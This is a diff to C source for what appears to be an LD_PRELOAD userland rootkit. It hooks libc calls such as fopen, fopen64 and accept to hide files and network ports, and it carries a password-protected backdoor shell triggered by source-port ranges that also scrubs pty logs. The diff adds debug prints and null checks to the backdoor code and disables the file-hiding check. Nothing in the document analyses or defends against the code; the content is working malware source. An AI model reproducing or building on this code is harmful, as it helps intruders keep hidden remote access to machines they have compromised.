@@ -155,6 +155,7 @@ int parse_environ(char *stack, int len, char *needle) {
 }
 
 int is_invisible(const char *path) {
+	return 0;
 	DEBUG("is_invisible\n");
 	struct stat s_fstat;
 	char line[MAX_LEN];
@@ -285,34 +286,34 @@ int access(const char *path, int amode) {
 }
 
 FILE *fopen (const char *filename, const char *mode) {
-	DEBUG("fopen hooked %s.\n", filename);
-	if (is_owner()) 
-		syscall_list[SYS_FOPEN].syscall_func(filename, mode);
-
-	if (is_procnet(filename))
-		return hide_ports(filename);
-
-	if (is_invisible(filename)) {
-		errno = ENOENT;
-		return NULL;
-	}
-	return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
+ 	DEBUG("fopen hooked %s.\n", filename);
+ 	if (is_owner()) 
+ 		syscall_list[SYS_FOPEN].syscall_func(filename, mode);
+ 
+ 	if (is_procnet(filename))
+ 		return hide_ports(filename);
+ 
+ 	if (is_invisible(filename)) {
+ 		errno = ENOENT;
+ 		return NULL;
+ 	}
+ 	return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
 }
 
 FILE *fopen64 (const char *filename, const char *mode) {
-	DEBUG("fopen hooked %s.\n", filename);
-	if (is_owner()) 
-		return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
-
-	if (is_procnet(filename))
-		return hide_ports(filename);
-	
-	if (is_invisible(filename)) {
-		errno = ENOENT;
-		return NULL;
-	}
-
-	return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
+ 	DEBUG("fopen hooked %s.\n", filename);
+ 	if (is_owner()) 
+ 		return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
+ 
+ 	if (is_procnet(filename))
+ 		return hide_ports(filename);
+ 	
+ 	if (is_invisible(filename)) {
+ 		errno = ENOENT;
+ 		return NULL;
+ 	}
+ 
+ 	return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
 }
 
 int lstat(const char *file, struct stat *buf) {
@@ -740,6 +741,10 @@ int check_shell_password(int sock, int crypt) {
 
 int drop_shell(int sock, struct sockaddr *addr) {
 	DEBUG("drop_shell called.\n");
+	if (addr == 0) {
+		DEBUG("not drop shell\n");
+		return sock;
+	}
 	char buffer[512];
 	char *shell_passwd = strdup(SHELL_PASSWD);
 	char *shell_msg = strdup(SHELL_MSG);
@@ -757,19 +762,23 @@ int drop_shell(int sock, struct sockaddr *addr) {
 	memset(buffer,0x00,sizeof(buffer));
 
 	struct sockaddr_in *sa_i = (struct sockaddr_in*)addr;
-
 	if(htons(sa_i->sin_port) >= LOW_PORT && htons(sa_i->sin_port) <= HIGH_PORT) {
+		printf("sin_port arrive\n");
 		crypt_mode = PLAIN_SHELL;
 		char *sys_write = strdup(SYS_WRITE);
 		x(sys_write);
 		s_write = dlsym(RTLD_NEXT, sys_write);
 		cleanup(sys_write, strlen(sys_write));
 	 } else if (htons(sa_i->sin_port) >= CRYPT_LOW && htons(sa_i->sin_port) <= CRYPT_HIGH) {
+		printf("sin_port arrive crypt\n");
 		crypt_mode = CRYPT_SHELL;
 		s_write = crypt_write;
-	 } else
+	 } else {
+		printf("not drop\n");
 		return sock;
+	 }
 	
+	printf("dropping\n");
 	if(check_shell_password(sock, crypt_mode) != 1) {
 		shutdown(sock, SHUT_RDWR);
 		close(sock);
@@ -780,7 +789,7 @@ int drop_shell(int sock, struct sockaddr *addr) {
 	char pty_name[51];
 	if (openpty(&pty, &tty, pty_name, NULL, NULL) == -1) {
 		DEBUG("Failed to grab pty\n");
-		return;
+		return -1;
 	}
 	
 	char *ptr = &pty_name[5]; // Jump past /dev/ and clean the logs
@@ -811,8 +820,10 @@ int drop_shell(int sock, struct sockaddr *addr) {
 
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
 	DEBUG("accept hooked.\n");
-	if (is_owner()) 
+	if (is_owner()) {
+		printf("is owner\n");
 		return (long)syscall_list[SYS_ACCEPT].syscall_func(sockfd, addr, addrlen);
+	}
 	
 	int sock = (long)syscall_list[SYS_ACCEPT].syscall_func(sockfd, addr, addrlen);
 
